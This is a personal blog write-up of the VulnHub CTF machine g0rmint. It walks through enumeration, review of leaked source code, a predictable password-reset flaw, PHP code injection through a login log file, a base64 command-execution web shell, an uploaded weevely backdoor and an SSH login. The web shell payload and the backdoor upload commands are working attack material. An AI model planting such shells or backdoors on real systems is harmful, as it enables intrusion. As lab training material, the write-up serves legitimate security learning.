---
title: Writeup g0rmint
date: 2017-11-23 00:00:00 +0000
layout: post
tags:
- vulnhub
- writeup
---
This one took me almost a week to finish, the desperate search for one archive took me 2 days and I struggled to find a necessary username which was sitting right in front my eyes all the time. As always it comes down to one key takeaway: [Enumeration is the key](https://twitter.com/NomanRiffat/status/932606470910246912).

Vulnerable Machine: [**g0rmint: 1, 3 Nov 2017**](https://www.vulnhub.com/entry/g0rmint-1,214/)

Description:

> It is based on a real world scenario I faced while testing for a client's site. Dedicated to Aunty g0rmint who is fed up of this government (g0rmint). Does anyone need to know about that Aunty to root the CTF? No  
> The CTF is tested on Vmware and working well as expected.  
> Difficulty level to get limited shell: Intermediate or advanced  
> Difficulty level for privilege escalation: No idea

Installation in VMWare was no problem, machine works in host-only network and connects to DHCP.

After finding the right IP and doing an nmap scan (open ports: http on 80 and ssh on 22), I found a directory to start with via robots.txt:

![]({{ site.baseurl }}/forestryio/images/2017-11-18 13_45_58.png)

/g0rmint/ provides a login form to some kind of CMS:

![]({{ site.baseurl }}/forestryio/images/2017-11-18 13_48_08.png)

A little research showed that g0rmint (gormint=government) is somehow related to a video of a rambling granny that went viral in Pakistan:

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container' style='margin-bottom:1em'><iframe src='https://www.youtube.com/embed/qTGXxdsDFfg' frameborder='0' allowfullscreen></iframe></div>

&nbsp;

At first the login.php didn't reveal anything to me, so I went on to list accessible files and directories:

![]({{ site.baseurl }}/forestryio/images/2017-11-18 15_36_35.png)

Here is what took me two days to resolve:

It took me 1 day to find this little fucker:

![]({{ site.baseurl }}/forestryio/images/2017-11-23 15_49_50.png)

And another one to figure learn once and for all, that I should enumerate newly found directories again, because contrary to what I expected the directory name itself led to nothing:

![]({{ site.baseurl }}/forestryio/images/2017-11-18 15_52_25.png)

![]({{ site.baseurl }}/forestryio/images/2017-11-18 15_55_33.png)

All it took was starting to scan this directory to find the file `info.php`:

![]({{ site.baseurl }}/forestryio/images/2017-11-19 20_34_58.png)

The file reveals another one, `backup.zip`: An archive containing a copy of the source code, which I crawled through search for any leads on how to proceed.

I [learned](https://www.slideshare.net/phpcodemonkey/exploiting-php-with-php) [something](https://www.exploit-db.com/raw/12871/) about exploiting vulnerable php apps and I found a useful tool - it's called [Visual Code Grapper](https://github.com/nccgroup/VCG) and scans php source code for possible vulnerabilities:

![]({{ site.baseurl }}/forestryio/images/2017-11-20 12_43_06.png)

I proceeded to install on my stack to see behind the scenes. At first glance `config.php` seemed to be the most interesting file. The addlog() function generates logfiles and allows to inject arbitrary code through the email field in the login form:

```php
function addlog($log, $reason) {
    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
    if (file_exists($myFile)) {
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\\n");
    } else {
        $fh = fopen($myFile, 'w');
        fwrite($fh, file_get_contents("dummy.php") . "<br>\\n");
        fclose($fh);
        $fh = fopen($myFile, 'a');
        fwrite($fh, $reason . $log . "<br>\\n");
    }
    fclose($fh);
}
```

![]({{ site.baseurl }}/forestryio/images/2017-11-21 08_25_23.png)

Log file with injected code. What a pity the header only allows authenticated users to access the date based logfiles:

![]({{ site.baseurl }}/forestryio/images/2017-11-21 08_26_31.png)

So I went back to the password reset function:

```php
<?php
include_once('config.php');
$message = "";
if (isset($_POST['submit'])) { // If form is submitted
    $email = $_POST['email'];
    $user = $_POST['user'];
    $sql = $pdo->prepare("SELECT * FROM g0rmint WHERE email = :email AND username = :user");
    $sql->bindParam(":email", $email);
    $sql->bindParam(":user", $user);
    $row = $sql->execute();
    $result = $sql->fetch(PDO::FETCH_ASSOC);
    if (count($result) > 1) {
        $password = substr(hash('sha1', gmdate("l jS \of F Y h:i:s A")), 0, 20);
        $password = md5($password);
        $sql = $pdo->prepare("UPDATE g0rmint SET pass = :pass where id = 1");
        $sql->bindParam(":pass", $password);
        $row = $sql->execute();
        $message = "A new password has been sent to your email";
    } else {
        $message = "User not found in our database";
    }
}
?>
```

If given a legitimate user, the function generates a new password based on gmdate. Luckily the date is displayed in the footer of every page, so the password is easy to generate:

![]({{ site.baseurl }}/forestryio/images/2017-11-22 12_34_26.png)

![]({{ site.baseurl }}/forestryio/images/2017-11-22 12_35_50.png)

The problem however was finding a legitimate user/email to reset:

![]({{ site.baseurl }}/forestryio/images/2017-11-22 12_10_30.png)

Hidden in plane sight in `style.css` another few hours lost looking stupid. Burpsuite hides css and images by default, so keep that in mind and don't be an idiot like me and overlook important comments in css files:

![]({{ site.baseurl }}/forestryio/images/2017-11-22 11_08_37.png)

Now as a legitimate user i could read the logfiles and as unauthenticated user write to the file through a "failed login". The function escapes quotes by [adding slashes](http://php.net/manual/en/function.addslashes.php), so I had to use one without:

```php
<?php echo shell_exec(base64_decode($_GET[cmd])); ?>
```

![]({{ site.baseurl }}/forestryio/images/2017-11-22 16_34_44.png)

Cool. A quick test showed it worked:

![]({{ site.baseurl }}/forestryio/images/2017-11-22 16_37_18.png)

And I could inject a weevely shell to feel a little more comfortable:

```bash
./weevely.py generate n0man  \~/web/html/g0rmint/weevely3/backd00r

# convert to base64:
cat backd000r |grep base64
```

Get the backdoor onto the server:

`http://192.168.181.128/g0rmint/s3cr3t-dir3ct0ry-f0r-l0gs/2017-11-22.php?cmd=ZWNobyBQRDl3YU[snip]`

Convert back to php:

`echo 'cat backd00r.php |base64 -d > backd00r2.php' |base64`

And connect from weevely3:

`./weevely3 http://192.168.181.128/g0rmint/s3cr3t-dir3ct0ry-f0r-l0gs/backd00r2.php n0man`

Although [everything](https://github.com/rebootuser/LinEnum) [I tried](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) [to escalate](https://github.com/PenturaLabs/Linux_Exploit_Suggester/archive/master.zip) privileges failed miserably, a simple `ls -alRtr /var/www` while listing files for the umpteenth time did reveal a second `backup.zip` in the root directory. Desperately looking for a clue I downloaded and extracted it and went through all the files again searching for something I might have had missed:

The sql dump of this backup contained:

```mysql
INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
(1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
```

![]({{ site.baseurl }}/forestryio/images/2017-11-23 14_03_10.png)

as opposed to:

```mysql
INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
(1, 'demo', 'demo@example.com', 'fe01ce2a7fbac8fafaed7c982a04e229');
```

pw: demo

So I tried logging through ssh with username g0rmint and password tayyab123:

![]({{ site.baseurl }}/forestryio/images/2017-11-23 17_12_32.png)

Damn you [@NomanRiffat](https://twitter.com/NomanRiffat/), you caused me some severe headaches!!

Thanks for teaching me a thing or two about the value of enumerating all the things. Looking forward to g0rmint 2.

&nbsp;
&nbsp;
